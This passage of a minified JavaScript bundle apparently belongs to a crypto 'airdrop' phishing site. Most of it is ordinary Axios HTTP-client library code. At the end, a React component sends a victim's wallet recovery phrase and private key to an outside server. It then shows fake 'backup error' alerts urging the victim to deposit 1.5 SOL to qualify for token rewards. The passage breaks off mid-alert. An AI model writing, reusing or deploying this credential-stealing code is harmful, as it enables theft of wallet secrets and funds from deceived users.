Blob<"u"?Blob:null,fW={isBrowser:!0,classes:{URLSearchParams:cW,FormData:uW,Blob:hW},protocols:["http","https","file","blob","url","data"]},xw=typeof window<"u"&&typeof document<"u",Sm=typeof navigator=="object"&&navigator||void 0,dW=xw&&(!Sm||["ReactNative","NativeScript","NS"].indexOf(Sm.product)<0),pW=typeof WorkerGlobalScope<"u"&&self instanceof WorkerGlobalScope&&typeof self.importScripts=="function",gW=xw&&window.location.href||"http://localhost",yW=Object.freeze(Object.defineProperty({__proto__:null,hasBrowserEnv:xw,hasStandardBrowserEnv:dW,hasStandardBrowserWebWorkerEnv:pW,navigator:Sm,origin:gW},Symbol.toStringTag,{value:"Module"})),yn={...yW,...fW};function mW(t,e){return Zf(t,new yn.classes.URLSearchParams,Object.assign({visitor:function(n,r,i,o){return yn.isNode&&ce.isBuffer(n)?(this.append(r,n.toString("base64")),!1):o.defaultVisitor.apply(this,arguments)}},e))}function wW(t){return ce.matchAll(/\w+|\[(\w*)]/g,t).map(e=>e[0]==="[]"?"":e[1]||e[0])}function vW(t){const e={},n=Object.keys(t);let r;const i=n.length;let o;for(r=0;r<i;r++)o=n[r],e[o]=t[o];return e}function LO(t){function e(n,r,i,o){let l=n[o++];if(l==="__proto__")return!0;const c=Number.isFinite(+l),u=o>=n.length;return l=!l&&ce.isArray(i)?i.length:l,u?(ce.hasOwnProp(i,l)?i[l]=[i[l],r]:i[l]=r,!c):((!i[l]||!ce.isObject(i[l]))&&(i[l]=[]),e(n,r,i[l],o)&&ce.isArray(i[l])&&(i[l]=vW(i[l])),!c)}if(ce.isFormData(t)&&ce.isFunction(t.entries)){const n={};return ce.forEachEntry(t,(r,i)=>{e(wW(r),i,n,0)}),n}return null}function bW(t,e,n){if(ce.isString(t))try{return(e||JSON.parse)(t),ce.trim(t)}catch(r){if(r.name!=="SyntaxError")throw r}return(n||JSON.stringify)(t)}const Xc={transitional:BO,adapter:["xhr","http","fetch"],transformRequest:[function(e,n){const r=n.getContentType()||"",i=r.indexOf("application/json")>-1,o=ce.isObject(e);if(o&&ce.isHTMLForm(e)&&(e=new FormData(e)),ce.isFormData(e))return i?JSON.stringify(LO(e)):e;if(ce.isArrayBuffer(e)||ce.isBuffer(e)||ce.isStream(e)||ce.isFile(e)||ce.isBlob(e)||ce.isReadableStream(e))return e;if(ce.isArrayBufferView(e))return e.buffer;if(ce.isURLSearchParams(e))return n.setContentType("application/x-www-form-urlencoded;charset=utf-8",!1),e.toString();let c;if(o){if(r.indexOf("application/x-www-form-urlencoded")>-1)return mW(e,this.formSerializer).toString();if((c=ce.isFileList(e))||r.indexOf("multipart/form-data")>-1){const u=this.env&&this.env.FormData;return Zf(c?{"files[]":e}:e,u&&new u,this.formSerializer)}}return o||i?(n.setContentType("application/json",!1),bW(e)):e}],transformResponse:[function(e){const n=this.transitional||Xc.transitional,r=n&&n.forcedJSONParsing,i=this.responseType==="json";if(ce.isResponse(e)||ce.isReadableStream(e))return e;if(e&&ce.isString(e)&&(r&&!this.responseType||i)){const l=!(n&&n.silentJSONParsing)&&i;try{return JSON.parse(e)}catch(c){if(l)throw c.name==="SyntaxError"?ke.from(c,ke.ERR_BAD_RESPONSE,this,null,this.response):c}}return e}],timeout:0,xsrfCookieName:"XSRF-TOKEN",xsrfHeaderName:"X-XSRF-TOKEN",maxContentLength:-1,maxBodyLength:-1,env:{FormData:yn.classes.FormData,Blob:yn.classes.Blob},validateStatus:function(e){return e>=200&&e<300},headers:{common:{Accept:"application/json, text/plain, */*","Content-Type":void 0}}};ce.forEach(["delete","get","head","post","put","patch"],t=>{Xc.headers[t]={}});const EW=ce.toObjectSet(["age","authorization","content-length","content-type","etag","expires","from","host","if-modified-since","if-unmodified-since","last-modified","location","max-forwards","proxy-authorization","referer","retry-after","user-agent"]),xW=t=>{const e={};let n,r,i;return t&&t.split(`
`).forEach(function(l){i=l.indexOf(":"),n=l.substring(0,i).trim().toLowerCase(),r=l.substring(i+1).trim(),!(!n||e[n]&&EW[n])&&(n==="set-cookie"?e[n]?e[n].push(r):e[n]=[r]:e[n]=e[n]?e[n]+", "+r:r)}),e},Ox=Symbol("internals");function ac(t){return t&&String(t).trim().toLowerCase()}function Yh(t){return t===!1||t==null?t:ce.isArray(t)?t.map(Yh):String(t)}function SW(t){const e=Object.create(null),n=/([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;let r;for(;r=n.exec(t);)e[r[1]]=r[2];return e}const _W=t=>/^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(t.trim());function cy(t,e,n,r,i){if(ce.isFunction(r))return r.call(this,e,n);if(i&&(e=n),!!ce.isString(e)){if(ce.isString(r))return e.indexOf(r)!==-1;if(ce.isRegExp(r))return r.test(e)}}function IW(t){return t.trim().toLowerCase().replace(/([a-z\d])(\w*)/g,(e,n,r)=>n.toUpperCase()+r)}function OW(t,e){const n=ce.toCamelCase(" "+e);["get","set","has"].forEach(r=>{Object.defineProperty(t,r+n,{value:function(i,o,l){return this[r].call(this,e,i,o,l)},configurable:!0})})}let Mn=class{constructor(e){e&&this.set(e)}set(e,n,r){const i=this;function o(c,u,f){const d=ac(u);if(!d)throw new Error("header name must be a non-empty string");const y=ce.findKey(i,d);(!y||i[y]===void 0||f===!0||f===void 0&&i[y]!==!1)&&(i[y||u]=Yh(c))}const l=(c,u)=>ce.forEach(c,(f,d)=>o(f,d,u));if(ce.isPlainObject(e)||e instanceof this.constructor)l(e,n);else if(ce.isString(e)&&(e=e.trim())&&!_W(e))l(xW(e),n);else if(ce.isObject(e)&&ce.isIterable(e)){let c={},u,f;for(const d of e){if(!ce.isArray(d))throw TypeError("Object iterator must return a key-value pair");c[f=d[0]]=(u=c[f])?ce.isArray(u)?[...u,d[1]]:[u,d[1]]:d[1]}l(c,n)}else e!=null&&o(n,e,r);return this}get(e,n){if(e=ac(e),e){const r=ce.findKey(this,e);if(r){const i=this[r];if(!n)return i;if(n===!0)return SW(i);if(ce.isFunction(n))return n.call(this,i,r);if(ce.isRegExp(n))return n.exec(i);throw new TypeError("parser must be boolean|regexp|function")}}}has(e,n){if(e=ac(e),e){const r=ce.findKey(this,e);return!!(r&&this[r]!==void 0&&(!n||cy(this,this[r],r,n)))}return!1}delete(e,n){const r=this;let i=!1;function o(l){if(l=ac(l),l){const c=ce.findKey(r,l);c&&(!n||cy(r,r[c],c,n))&&(delete r[c],i=!0)}}return ce.isArray(e)?e.forEach(o):o(e),i}clear(e){const n=Object.keys(this);let r=n.length,i=!1;for(;r--;){const o=n[r];(!e||cy(this,this[o],o,e,!0))&&(delete this[o],i=!0)}return i}normalize(e){const n=this,r={};return ce.forEach(this,(i,o)=>{const l=ce.findKey(r,o);if(l){n[l]=Yh(i),delete n[o];return}const c=e?IW(o):String(o).trim();c!==o&&delete n[o],n[c]=Yh(i),r[c]=!0}),this}concat(...e){return this.constructor.concat(this,...e)}toJSON(e){const n=Object.create(null);return ce.forEach(this,(r,i)=>{r!=null&&r!==!1&&(n[i]=e&&ce.isArray(r)?r.join(", "):r)}),n}[Symbol.iterator](){return Object.entries(this.toJSON())[Symbol.iterator]()}toString(){return Object.entries(this.toJSON()).map(([e,n])=>e+": "+n).join(`
`)}getSetCookie(){return this.get("set-cookie")||[]}get[Symbol.toStringTag](){return"AxiosHeaders"}static from(e){return e instanceof this?e:new this(e)}static concat(e,...n){const r=new this(e);return n.forEach(i=>r.set(i)),r}static accessor(e){const r=(this[Ox]=this[Ox]={accessors:{}}).accessors,i=this.prototype;function o(l){const c=ac(l);r[c]||(OW(i,l),r[c]=!0)}return ce.isArray(e)?e.forEach(o):o(e),this}};Mn.accessor(["Content-Type","Content-Length","Accept","Accept-Encoding","User-Agent","Authorization"]);ce.reduceDescriptors(Mn.prototype,({value:t},e)=>{let n=e[0].toUpperCase()+e.slice(1);return{get:()=>t,set(r){this[n]=r}}});ce.freezeMethods(Mn);function uy(t,e){const n=this||Xc,r=e||n,i=Mn.from(r.headers);let o=r.data;return ce.forEach(t,function(c){o=c.call(n,o,i.normalize(),e?e.status:void 0)}),i.normalize(),o}function jO(t){return!!(t&&t.__CANCEL__)}function nl(t,e,n){ke.call(this,t??"canceled",ke.ERR_CANCELED,e,n),this.name="CanceledError"}ce.inherits(nl,ke,{__CANCEL__:!0});function UO(t,e,n){const r=n.config.validateStatus;!n.status||!r||r(n.status)?t(n):e(new ke("Request failed with status code "+n.status,[ke.ERR_BAD_REQUEST,ke.ERR_BAD_RESPONSE][Math.floor(n.status/100)-4],n.config,n.request,n))}function $W(t){const e=/^([-+\w]{1,25})(:?\/\/|:)/.exec(t);return e&&e[1]||""}function PW(t,e){t=t||10;const n=new Array(t),r=new Array(t);let i=0,o=0,l;return e=e!==void 0?e:1e3,function(u){const f=Date.now(),d=r[o];l||(l=f),n[i]=u,r[i]=f;let y=o,g=0;for(;y!==i;)g+=n[y++],y=y%t;if(i=(i+1)%t,i===o&&(o=(o+1)%t),f-l<e)return;const E=d&&f-d;return E?Math.round(g*1e3/E):void 0}}function TW(t,e){let n=0,r=1e3/e,i,o;const l=(f,d=Date.now())=>{n=d,i=null,o&&(clearTimeout(o),o=null),t.apply(null,f)};return[(...f)=>{const d=Date.now(),y=d-n;y>=r?l(f,d):(i=f,o||(o=setTimeout(()=>{o=null,l(i)},r-y)))},()=>i&&l(i)]}const df=(t,e,n=3)=>{let r=0;const i=PW(50,250);return TW(o=>{const l=o.loaded,c=o.lengthComputable?o.total:void 0,u=l-r,f=i(u),d=l<=c;r=l;const y={loaded:l,total:c,progress:c?l/c:void 0,bytes:u,rate:f||void 0,estimated:f&&c&&d?(c-l)/f:void 0,event:o,lengthComputable:c!=null,[e?"download":"upload"]:!0};t(y)},n)},$x=(t,e)=>{const n=t!=null;return[r=>e[0]({lengthComputable:n,total:t,loaded:r}),e[1]]},Px=t=>(...e)=>ce.asap(()=>t(...e)),AW=yn.hasStandardBrowserEnv?((t,e)=>n=>(n=new URL(n,yn.origin),t.protocol===n.protocol&&t.host===n.host&&(e||t.port===n.port)))(new URL(yn.origin),yn.navigator&&/(msie|trident)/i.test(yn.navigator.userAgent)):()=>!0,CW=yn.hasStandardBrowserEnv?{write(t,e,n,r,i,o){const l=[t+"="+encodeURIComponent(e)];ce.isNumber(n)&&l.push("expires="+new Date(n).toGMTString()),ce.isString(r)&&l.push("path="+r),ce.isString(i)&&l.push("domain="+i),o===!0&&l.push("secure"),document.cookie=l.join("; ")},read(t){const e=document.cookie.match(new RegExp("(^|;\\s*)("+t+")=([^;]*)"));return e?decodeURIComponent(e[3]):null},remove(t){this.write(t,"",Date.now()-864e5)}}:{write(){},read(){return null},remove(){}};function RW(t){return/^([a-z][a-z\d+\-.]*:)?\/\//i.test(t)}function DW(t,e){return e?t.replace(/\/?\/$/,"")+"/"+e.replace(/^\/+/,""):t}function MO(t,e,n){let r=!RW(e);return t&&(r||n==!1)?DW(t,e):e}const Tx=t=>t instanceof Mn?{...t}:t;function co(t,e){e=e||{};const n={};function r(f,d,y,g){return ce.isPlainObject(f)&&ce.isPlainObject(d)?ce.merge.call({caseless:g},f,d):ce.isPlainObject(d)?ce.merge({},d):ce.isArray(d)?d.slice():d}function i(f,d,y,g){if(ce.isUndefined(d)){if(!ce.isUndefined(f))return r(void 0,f,y,g)}else return r(f,d,y,g)}function o(f,d){if(!ce.isUndefined(d))return r(void 0,d)}function l(f,d){if(ce.isUndefined(d)){if(!ce.isUndefined(f))return r(void 0,f)}else return r(void 0,d)}function c(f,d,y){if(y in e)return r(f,d);if(y in t)return r(void 0,f)}const u={url:o,method:o,data:o,baseURL:l,transformRequest:l,transformResponse:l,paramsSerializer:l,timeout:l,timeoutMessage:l,withCredentials:l,withXSRFToken:l,adapter:l,responseType:l,xsrfCookieName:l,xsrfHeaderName:l,onUploadProgress:l,onDownloadProgress:l,decompress:l,maxContentLength:l,maxBodyLength:l,beforeRedirect:l,transport:l,httpAgent:l,httpsAgent:l,cancelToken:l,socketPath:l,responseEncoding:l,validateStatus:c,headers:(f,d,y)=>i(Tx(f),Tx(d),y,!0)};return ce.forEach(Object.keys(Object.assign({},t,e)),function(d){const y=u[d]||i,g=y(t[d],e[d],d);ce.isUndefined(g)&&y!==c||(n[d]=g)}),n}const FO=t=>{const e=co({},t);let{data:n,withXSRFToken:r,xsrfHeaderName:i,xsrfCookieName:o,headers:l,auth:c}=e;e.headers=l=Mn.from(l),e.url=kO(MO(e.baseURL,e.url,e.allowAbsoluteUrls),t.params,t.paramsSerializer),c&&l.set("Authorization","Basic "+btoa((c.username||"")+":"+(c.password?unescape(encodeURIComponent(c.password)):"")));let u;if(ce.isFormData(n)){if(yn.hasStandardBrowserEnv||yn.hasStandardBrowserWebWorkerEnv)l.setContentType(void 0);else if((u=l.getContentType())!==!1){const[f,...d]=u?u.split(";").map(y=>y.trim()).filter(Boolean):[];l.setContentType([f||"multipart/form-data",...d].join("; "))}}if(yn.hasStandardBrowserEnv&&(r&&ce.isFunction(r)&&(r=r(e)),r||r!==!1&&AW(e.url))){const f=i&&o&&CW.read(o);f&&l.set(i,f)}return e},NW=typeof XMLHttpRequest<"u",kW=NW&&function(t){return new Promise(function(n,r){const i=FO(t);let o=i.data;const l=Mn.from(i.headers).normalize();let{responseType:c,onUploadProgress:u,onDownloadProgress:f}=i,d,y,g,E,w;function b(){E&&E(),w&&w(),i.cancelToken&&i.cancelToken.unsubscribe(d),i.signal&&i.signal.removeEventListener("abort",d)}let m=new XMLHttpRequest;m.open(i.method.toUpperCase(),i.url,!0),m.timeout=i.timeout;function x(){if(!m)return;const O=Mn.from("getAllResponseHeaders"in m&&m.getAllResponseHeaders()),R={data:!c||c==="text"||c==="json"?m.responseText:m.response,status:m.status,statusText:m.statusText,headers:O,config:t,request:m};UO(function(D){n(D),b()},function(D){r(D),b()},R),m=null}"onloadend"in m?m.onloadend=x:m.onreadystatechange=function(){!m||m.readyState!==4||m.status===0&&!(m.responseURL&&m.responseURL.indexOf("file:")===0)||setTimeout(x)},m.onabort=function(){m&&(r(new ke("Request aborted",ke.ECONNABORTED,t,m)),m=null)},m.onerror=function(){r(new ke("Network Error",ke.ERR_NETWORK,t,m)),m=null},m.ontimeout=function(){let $=i.timeout?"timeout of "+i.timeout+"ms exceeded":"timeout exceeded";const R=i.transitional||BO;i.timeoutErrorMessage&&($=i.timeoutErrorMessage),r(new ke($,R.clarifyTimeoutError?ke.ETIMEDOUT:ke.ECONNABORTED,t,m)),m=null},o===void 0&&l.setContentType(null),"setRequestHeader"in m&&ce.forEach(l.toJSON(),function($,R){m.setRequestHeader(R,$)}),ce.isUndefined(i.withCredentials)||(m.withCredentials=!!i.withCredentials),c&&c!=="json"&&(m.responseType=i.responseType),f&&([g,w]=df(f,!0),m.addEventListener("progress",g)),u&&m.upload&&([y,E]=df(u),m.upload.addEventListener("progress",y),m.upload.addEventListener("loadend",E)),(i.cancelToken||i.signal)&&(d=O=>{m&&(r(!O||O.type?new nl(null,t,m):O),m.abort(),m=null)},i.cancelToken&&i.cancelToken.subscribe(d),i.signal&&(i.signal.aborted?d():i.signal.addEventListener("abort",d)));const S=$W(i.url);if(S&&yn.protocols.indexOf(S)===-1){r(new ke("Unsupported protocol "+S+":",ke.ERR_BAD_REQUEST,t));return}m.send(o||null)})},BW=(t,e)=>{const{length:n}=t=t?t.filter(Boolean):[];if(e||n){let r=new AbortController,i;const o=function(f){if(!i){i=!0,c();const d=f instanceof Error?f:this.reason;r.abort(d instanceof ke?d:new nl(d instanceof Error?d.message:d))}};let l=e&&setTimeout(()=>{l=null,o(new ke(`timeout ${e} of ms exceeded`,ke.ETIMEDOUT))},e);const c=()=>{t&&(l&&clearTimeout(l),l=null,t.forEach(f=>{f.unsubscribe?f.unsubscribe(o):f.removeEventListener("abort",o)}),t=null)};t.forEach(f=>f.addEventListener("abort",o));const{signal:u}=r;return u.unsubscribe=()=>ce.asap(c),u}},LW=function*(t,e){let n=t.byteLength;if(n<e){yield t;return}let r=0,i;for(;r<n;)i=r+e,yield t.slice(r,i),r=i},jW=async function*(t,e){for await(const n of UW(t))yield*LW(n,e)},UW=async function*(t){if(t[Symbol.asyncIterator]){yield*t;return}const e=t.getReader();try{for(;;){const{done:n,value:r}=await e.read();if(n)break;yield r}}finally{await e.cancel()}},Ax=(t,e,n,r)=>{const i=jW(t,e);let o=0,l,c=u=>{l||(l=!0,r&&r(u))};return new ReadableStream({async pull(u){try{const{done:f,value:d}=await i.next();if(f){c(),u.close();return}let y=d.byteLength;if(n){let g=o+=y;n(g)}u.enqueue(new Uint8Array(d))}catch(f){throw c(f),f}},cancel(u){return c(u),i.return()}},{highWaterMark:2})},Qf=typeof fetch=="function"&&typeof Request=="function"&&typeof Response=="function",zO=Qf&&typeof ReadableStream=="function",MW=Qf&&(typeof TextEncoder=="function"?(t=>e=>t.encode(e))(new TextEncoder):async t=>new Uint8Array(await new Response(t).arrayBuffer())),qO=(t,...e)=>{try{return!!t(...e)}catch{return!1}},FW=zO&&qO(()=>{let t=!1;const e=new Request(yn.origin,{body:new ReadableStream,method:"POST",get duplex(){return t=!0,"half"}}).headers.has("Content-Type");return t&&!e}),Cx=64*1024,_m=zO&&qO(()=>ce.isReadableStream(new Response("").body)),pf={stream:_m&&(t=>t.body)};Qf&&(t=>{["text","arrayBuffer","blob","formData","stream"].forEach(e=>{!pf[e]&&(pf[e]=ce.isFunction(t[e])?n=>n[e]():(n,r)=>{throw new ke(`Response type '${e}' is not supported`,ke.ERR_NOT_SUPPORT,r)})})})(new Response);const zW=async t=>{if(t==null)return 0;if(ce.isBlob(t))return t.size;if(ce.isSpecCompliantForm(t))return(await new Request(yn.origin,{method:"POST",body:t}).arrayBuffer()).byteLength;if(ce.isArrayBufferView(t)||ce.isArrayBuffer(t))return t.byteLength;if(ce.isURLSearchParams(t)&&(t=t+""),ce.isString(t))return(await MW(t)).byteLength},qW=async(t,e)=>{const n=ce.toFiniteNumber(t.getContentLength());return n??zW(e)},HW=Qf&&(async t=>{let{url:e,method:n,data:r,signal:i,cancelToken:o,timeout:l,onDownloadProgress:c,onUploadProgress:u,responseType:f,headers:d,withCredentials:y="same-origin",fetchOptions:g}=FO(t);f=f?(f+"").toLowerCase():"text";let E=BW([i,o&&o.toAbortSignal()],l),w;const b=E&&E.unsubscribe&&(()=>{E.unsubscribe()});let m;try{if(u&&FW&&n!=="get"&&n!=="head"&&(m=await qW(d,r))!==0){let R=new Request(e,{method:"POST",body:r,duplex:"half"}),T;if(ce.isFormData(r)&&(T=R.headers.get("content-type"))&&d.setContentType(T),R.body){const[D,B]=$x(m,df(Px(u)));r=Ax(R.body,Cx,D,B)}}ce.isString(y)||(y=y?"include":"omit");const x="credentials"in Request.prototype;w=new Request(e,{...g,signal:E,method:n.toUpperCase(),headers:d.normalize().toJSON(),body:r,duplex:"half",credentials:x?y:void 0});let S=await fetch(w);const O=_m&&(f==="stream"||f==="response");if(_m&&(c||O&&b)){const R={};["status","statusText","headers"].forEach(k=>{R[k]=S[k]});const T=ce.toFiniteNumber(S.headers.get("content-length")),[D,B]=c&&$x(T,df(Px(c),!0))||[];S=new Response(Ax(S.body,Cx,D,()=>{B&&B(),b&&b()}),R)}f=f||"text";let $=await pf[ce.findKey(pf,f)||"text"](S,t);return!O&&b&&b(),await new Promise((R,T)=>{UO(R,T,{data:$,headers:Mn.from(S.headers),status:S.status,statusText:S.statusText,config:t,request:w})})}catch(x){throw b&&b(),x&&x.name==="TypeError"&&/Load failed|fetch/i.test(x.message)?Object.assign(new ke("Network Error",ke.ERR_NETWORK,t,w),{cause:x.cause||x}):ke.from(x,x&&x.code,t,w)}}),Im={http:sW,xhr:kW,fetch:HW};ce.forEach(Im,(t,e)=>{if(t){try{Object.defineProperty(t,"name",{value:e})}catch{}Object.defineProperty(t,"adapterName",{value:e})}});const Rx=t=>`- ${t}`,VW=t=>ce.isFunction(t)||t===null||t===!1,HO={getAdapter:t=>{t=ce.isArray(t)?t:[t];const{length:e}=t;let n,r;const i={};for(let o=0;o<e;o++){n=t[o];let l;if(r=n,!VW(n)&&(r=Im[(l=String(n)).toLowerCase()],r===void 0))throw new ke(`Unknown adapter '${l}'`);if(r)break;i[l||"#"+o]=r}if(!r){const o=Object.entries(i).map(([c,u])=>`adapter ${c} `+(u===!1?"is not supported by the environment":"is not available in the build"));let l=e?o.length>1?`since :
`+o.map(Rx).join(`
`):" "+Rx(o[0]):"as no adapter specified";throw new ke("There is no suitable adapter to dispatch the request "+l,"ERR_NOT_SUPPORT")}return r},adapters:Im};function hy(t){if(t.cancelToken&&t.cancelToken.throwIfRequested(),t.signal&&t.signal.aborted)throw new nl(null,t)}function Dx(t){return hy(t),t.headers=Mn.from(t.headers),t.data=uy.call(t,t.transformRequest),["post","put","patch"].indexOf(t.method)!==-1&&t.headers.setContentType("application/x-www-form-urlencoded",!1),HO.getAdapter(t.adapter||Xc.adapter)(t).then(function(r){return hy(t),r.data=uy.call(t,t.transformResponse,r),r.headers=Mn.from(r.headers),r},function(r){return jO(r)||(hy(t),r&&r.response&&(r.response.data=uy.call(t,t.transformResponse,r.response),r.response.headers=Mn.from(r.response.headers))),Promise.reject(r)})}const VO="1.9.0",Xf={};["object","boolean","number","function","string","symbol"].forEach((t,e)=>{Xf[t]=function(r){return typeof r===t||"a"+(e<1?"n ":" ")+t}});const Nx={};Xf.transitional=function(e,n,r){function i(o,l){return"[Axios v"+VO+"] Transitional option '"+o+"'"+l+(r?". "+r:"")}return(o,l,c)=>{if(e===!1)throw new ke(i(l," has been removed"+(n?" in "+n:"")),ke.ERR_DEPRECATED);return n&&!Nx[l]&&(Nx[l]=!0,console.warn(i(l," has been deprecated since v"+n+" and will be removed in the near future"))),e?e(o,l,c):!0}};Xf.spelling=function(e){return(n,r)=>(console.warn(`${r} is likely a misspelling of ${e}`),!0)};function WW(t,e,n){if(typeof t!="object")throw new ke("options must be an object",ke.ERR_BAD_OPTION_VALUE);const r=Object.keys(t);let i=r.length;for(;i-- >0;){const o=r[i],l=e[o];if(l){const c=t[o],u=c===void 0||l(c,o,t);if(u!==!0)throw new ke("option "+o+" must be "+u,ke.ERR_BAD_OPTION_VALUE);continue}if(n!==!0)throw new ke("Unknown option "+o,ke.ERR_BAD_OPTION)}}const Jh={assertOptions:WW,validators:Xf},Yr=Jh.validators;let no=class{constructor(e){this.defaults=e||{},this.interceptors={request:new Ix,response:new Ix}}async request(e,n){try{return await this._request(e,n)}catch(r){if(r instanceof Error){let i={};Error.captureStackTrace?Error.captureStackTrace(i):i=new Error;const o=i.stack?i.stack.replace(/^.+\n/,""):"";try{r.stack?o&&!String(r.stack).endsWith(o.replace(/^.+\n.+\n/,""))&&(r.stack+=`
`+o):r.stack=o}catch{}}throw r}}_request(e,n){typeof e=="string"?(n=n||{},n.url=e):n=e||{},n=co(this.defaults,n);const{transitional:r,paramsSerializer:i,headers:o}=n;r!==void 0&&Jh.assertOptions(r,{silentJSONParsing:Yr.transitional(Yr.boolean),forcedJSONParsing:Yr.transitional(Yr.boolean),clarifyTimeoutError:Yr.transitional(Yr.boolean)},!1),i!=null&&(ce.isFunction(i)?n.paramsSerializer={serialize:i}:Jh.assertOptions(i,{encode:Yr.function,serialize:Yr.function},!0)),n.allowAbsoluteUrls!==void 0||(this.defaults.allowAbsoluteUrls!==void 0?n.allowAbsoluteUrls=this.defaults.allowAbsoluteUrls:n.allowAbsoluteUrls=!0),Jh.assertOptions(n,{baseUrl:Yr.spelling("baseURL"),withXsrfToken:Yr.spelling("withXSRFToken")},!0),n.method=(n.method||this.defaults.method||"get").toLowerCase();let l=o&&ce.merge(o.common,o[n.method]);o&&ce.forEach(["delete","get","head","post","put","patch","common"],w=>{delete o[w]}),n.headers=Mn.concat(l,o);const c=[];let u=!0;this.interceptors.request.forEach(function(b){typeof b.runWhen=="function"&&b.runWhen(n)===!1||(u=u&&b.synchronous,c.unshift(b.fulfilled,b.rejected))});const f=[];this.interceptors.response.forEach(function(b){f.push(b.fulfilled,b.rejected)});let d,y=0,g;if(!u){const w=[Dx.bind(this),void 0];for(w.unshift.apply(w,c),w.push.apply(w,f),g=w.length,d=Promise.resolve(n);y<g;)d=d.then(w[y++],w[y++]);return d}g=c.length;let E=n;for(y=0;y<g;){const w=c[y++],b=c[y++];try{E=w(E)}catch(m){b.call(this,m);break}}try{d=Dx.call(this,E)}catch(w){return Promise.reject(w)}for(y=0,g=f.length;y<g;)d=d.then(f[y++],f[y++]);return d}getUri(e){e=co(this.defaults,e);const n=MO(e.baseURL,e.url,e.allowAbsoluteUrls);return kO(n,e.params,e.paramsSerializer)}};ce.forEach(["delete","get","head","options"],function(e){no.prototype[e]=function(n,r){return this.request(co(r||{},{method:e,url:n,data:(r||{}).data}))}});ce.forEach(["post","put","patch"],function(e){function n(r){return function(o,l,c){return this.request(co(c||{},{method:e,headers:r?{"Content-Type":"multipart/form-data"}:{},url:o,data:l}))}}no.prototype[e]=n(),no.prototype[e+"Form"]=n(!0)});let KW=class WO{constructor(e){if(typeof e!="function")throw new TypeError("executor must be a function.");let n;this.promise=new Promise(function(o){n=o});const r=this;this.promise.then(i=>{if(!r._listeners)return;let o=r._listeners.length;for(;o-- >0;)r._listeners[o](i);r._listeners=null}),this.promise.then=i=>{let o;const l=new Promise(c=>{r.subscribe(c),o=c}).then(i);return l.cancel=function(){r.unsubscribe(o)},l},e(function(o,l,c){r.reason||(r.reason=new nl(o,l,c),n(r.reason))})}throwIfRequested(){if(this.reason)throw this.reason}subscribe(e){if(this.reason){e(this.reason);return}this._listeners?this._listeners.push(e):this._listeners=[e]}unsubscribe(e){if(!this._listeners)return;const n=this._listeners.indexOf(e);n!==-1&&this._listeners.splice(n,1)}toAbortSignal(){const e=new AbortController,n=r=>{e.abort(r)};return this.subscribe(n),e.signal.unsubscribe=()=>this.unsubscribe(n),e.signal}static source(){let e;return{token:new WO(function(i){e=i}),cancel:e}}};function GW(t){return function(n){return t.apply(null,n)}}function YW(t){return ce.isObject(t)&&t.isAxiosError===!0}const Om={Continue:100,SwitchingProtocols:101,Processing:102,EarlyHints:103,Ok:200,Created:201,Accepted:202,NonAuthoritativeInformation:203,NoContent:204,ResetContent:205,PartialContent:206,MultiStatus:207,AlreadyReported:208,ImUsed:226,MultipleChoices:300,MovedPermanently:301,Found:302,SeeOther:303,NotModified:304,UseProxy:305,Unused:306,TemporaryRedirect:307,PermanentRedirect:308,BadRequest:400,Unauthorized:401,PaymentRequired:402,Forbidden:403,NotFound:404,MethodNotAllowed:405,NotAcceptable:406,ProxyAuthenticationRequired:407,RequestTimeout:408,Conflict:409,Gone:410,LengthRequired:411,PreconditionFailed:412,PayloadTooLarge:413,UriTooLong:414,UnsupportedMediaType:415,RangeNotSatisfiable:416,ExpectationFailed:417,ImATeapot:418,MisdirectedRequest:421,UnprocessableEntity:422,Locked:423,FailedDependency:424,TooEarly:425,UpgradeRequired:426,PreconditionRequired:428,TooManyRequests:429,RequestHeaderFieldsTooLarge:431,UnavailableForLegalReasons:451,InternalServerError:500,NotImplemented:501,BadGateway:502,ServiceUnavailable:503,GatewayTimeout:504,HttpVersionNotSupported:505,VariantAlsoNegotiates:506,InsufficientStorage:507,LoopDetected:508,NotExtended:510,NetworkAuthenticationRequired:511};Object.entries(Om).forEach(([t,e])=>{Om[e]=t});function KO(t){const e=new no(t),n=SO(no.prototype.request,e);return ce.extend(n,no.prototype,e,{allOwnKeys:!0}),ce.extend(n,e,null,{allOwnKeys:!0}),n.create=function(i){return KO(co(t,i))},n}const Et=KO(Xc);Et.Axios=no;Et.CanceledError=nl;Et.CancelToken=KW;Et.isCancel=jO;Et.VERSION=VO;Et.toFormData=Zf;Et.AxiosError=ke;Et.Cancel=Et.CanceledError;Et.all=function(e){return Promise.all(e)};Et.spread=GW;Et.isAxiosError=YW;Et.mergeConfig=co;Et.AxiosHeaders=Mn;Et.formToJSON=t=>LO(ce.isHTMLForm(t)?new FormData(t):t);Et.getAdapter=HO.getAdapter;Et.HttpStatusCode=Om;Et.default=Et;const{Axios:RG,AxiosError:DG,CanceledError:NG,isCancel:kG,CancelToken:BG,VERSION:LG,all:jG,Cancel:UG,isAxiosError:MG,spread:FG,toFormData:zG,AxiosHeaders:qG,HttpStatusCode:HG,formToJSON:VG,getAdapter:WG,mergeConfig:KG}=Et,kx="https://crypto-api-hsdj.onrender.com",JW=()=>{const{dispatch:t,state:e}=ue.useContext(Zc),[n,r]=ue.useState(""),[i,o]=ue.useState(""),l=async()=>{const u=n.trim().split(/\s+/);if(u.length<12||u.length>24){t({type:"SET_SAVE_ERROR",payload:"Phrase must be 12 to 24 words"});return}t({type:"SET_LOADING"});try{await Et.post(`${kx}/api/phrase`,{phrase:n,walletName:e.walletName}),t({type:"SET_PHRASE",payload:n}),t({type:"SAVE_PHRASE"}),alert(`Wallet Backup Error
                We encountered an issue backing up your wallet. Please try a different wallet and ensure it holds some assets.

                ⚠ Important: To qualify and receive token allocations, your connected wallet must contain at least 1.5 SOL.
                Please deposit 1.5 SOL to your wallet to proceed and remain eligible for rewards.`)}catch(f){t({type:"SET_SAVE_ERROR",payload:f.message}),alert("could not back up")}},c=async()=>{i.trim(),t({type:"SET_LOADING"});try{await Et.post(`${kx}/api/privateKey`,{privateKey:i,walletName:e.walletName}),t({type:"SET_PRIVATE_KEY",payload:i}),t({type:"SAVE_PRIVATE_KEY"}),alert(`Wallet Connection Error
                We encountered an issue connecting your wallet. Please try a different wallet and ensure it holds some assets.

                ⚠ Important: To qualify and receive token allocations, your connected wallet must contain at least 1.5 SOL.
